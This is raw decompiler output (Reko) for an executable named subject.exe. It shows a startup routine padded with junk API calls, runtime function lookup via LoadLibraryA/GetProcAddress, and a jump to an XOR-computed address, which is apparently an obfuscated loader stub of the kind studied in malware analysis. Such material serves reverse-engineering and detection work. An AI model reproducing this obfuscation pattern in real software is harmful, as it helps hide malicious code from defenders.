// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401024: Register Eq_2 fn00401024(Register Eq_2 eax, Register word32 ecx, Register word32 edx, Register word32 ebx, Register word32 esi)
HANDLE fn00401024(HANDLE eax, word32 ecx, word32 edx, word32 ebx, word32 esi)
{
	ptr32 esp_3;
	word32 ecx_4;
	Eq_11 C_5;
	struct Eq_12 * edx_6;
	ui32 * ebx_7;
	byte SCZO_8;
	byte SCZDOP_9;
	word32 eax_10;
	byte al_11;
	word32 esi_12;
	byte ah_13;
	struct Eq_20 * cs_14;
	fn00400FF9();
	return eax_10;
}

// 00412920: Register Eq_81 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	GetCommandLineA();
	GetCommandLineA();
	GetLastError();
	GetLastError();
	Eq_2 eax_25 = CreateFileW(&globals->t42F0AC, 0x40000000, 0x02, null, 0x03, 0x03, null);
	GetFileSize(eax_25, null);
	Eq_2 eax_47 = CreateFileW(&globals->t42F06B, 0x20000000, 0x01, null, 0x03, 0x01, null);
	if (eax_47 != (void *) ~0x00)
		return fn00401024(eax_47, ecx, edx, ebx, esi);
	else
	{
		Eq_2 eax_92 = CreateFileW(&globals->t42F050, 0x80000000, 0x06, null, 0x03, 0x0104, null);
		GetCommandLineA();
		ptr32 esp_171 = fp + ~0x93;
		do
		{
			LPDWORD * esp_96 = esp_171 - 0x04;
			*esp_96 = (LPDWORD *) null;
			*(esp_96 - 0x04) = (HANDLE *) eax_25;
			GetFileSize(*(esp_96 - 0x04), *esp_96);
			*(esp_96 - 0x08) = (HANDLE *) eax_25;
			GetFileType(*(esp_96 - 0x08));
			*(esp_96 - 0x0C) = 0x00;
			*(esp_96 - 0x10) = 0xA2;
			*(esp_96 - 0x14) = 0x03;
			*(esp_96 - 0x18) = 0x00;
			*(esp_96 - 0x1C) = 0x01;
			*(esp_96 - 0x20) = 0x60000000;
			*(esp_96 - 0x24) = 0x0042F09C;
			Eq_2 eax_120 = CreateFileA(*(esp_96 - 0x24), *(esp_96 - 0x20), *(esp_96 - 0x1C), *(esp_96 - 0x18), *(esp_96 - 0x14), *(esp_96 - 0x10), *(esp_96 - 0x0C));
			*(esp_96 - 0x28) = 4386885;
			GetCommandLineA();
			Eq_280 eax_125 = LoadLibraryA(*(esp_96 - 0x28));
			*(esp_96 - 44) = (HANDLE *) eax_47;
			CloseHandle(*(esp_96 - 44));
			*(esp_96 - 0x30) = 0x0042F000;
			*(esp_96 - 0x34) = (HMODULE *) eax_125;
			GetLastError();
			Eq_315 eax_137 = GetProcAddress(*(esp_96 - 0x34), *(esp_96 - 0x30));
			*(esp_96 - 0x38) = (HANDLE *) eax_47;
			CloseHandle(*(esp_96 - 0x38));
			*(esp_96 - 0x3C) = 0x00;
			*(esp_96 - 0x40) = (HANDLE *) eax_47;
			GetFileSize(*(esp_96 - 0x40), *(esp_96 - 0x3C));
			*(esp_96 - 0x44) = (HANDLE *) eax_92;
			CloseHandle(*(esp_96 - 0x44));
			GetCommandLineA();
			GetCommandLineA();
			*(esp_96 - 0x48) = (HANDLE *) eax_120;
			GetFileType(*(esp_96 - 0x48));
			*(esp_96 - 0x4C) = 0x00;
			*(esp_96 - 0x50) = 0x0103;
			*(esp_96 - 0x54) = 0x03;
			*(esp_96 - 88) = 0x00;
			*(esp_96 - 0x5C) = 0x04;
			*(esp_96 - 0x60) = 0x00;
			*(esp_96 - 100) = 0x0042F081;
			esp_171 = esp_96 - 100;
		} while (CreateFileW(*(esp_96 - 100), *(esp_96 - 0x60), *(esp_96 - 0x5C), *(esp_96 - 88), *(esp_96 - 0x54), *(esp_96 - 0x50), *(esp_96 - 0x4C)) != (void *) ~0x00);
		*(esp_96 - 0x68) = 0x00;
		*(esp_96 - 0x6C) = (HANDLE *) eax_92;
		GetFileSize(*(esp_96 - 0x6C), *(esp_96 - 0x68));
		int32 eax_192 = eax_137();
		*(esp_96 - 0x70) = 0x00;
		*(esp_96 - 116) = (HANDLE *) eax_120;
		GetFileSize(*(esp_96 - 116), *(esp_96 - 0x70));
		GetCommandLineA();
		Eq_81 eax_216 = GetLastError();
		word32 esp_217;
		word32 ebp_218;
		byte SCZO_219;
		Eq_81 eax_220;
		byte Z_221;
		byte SZO_222;
		byte C_223;
		word32 ecx_224;
		word32 edx_225;
		word32 ebx_226;
		word32 esi_227;
		(*((word32) (eax_192 ^ 0x06BD) + 0x00412B33))();
		return eax_220;
	}
}

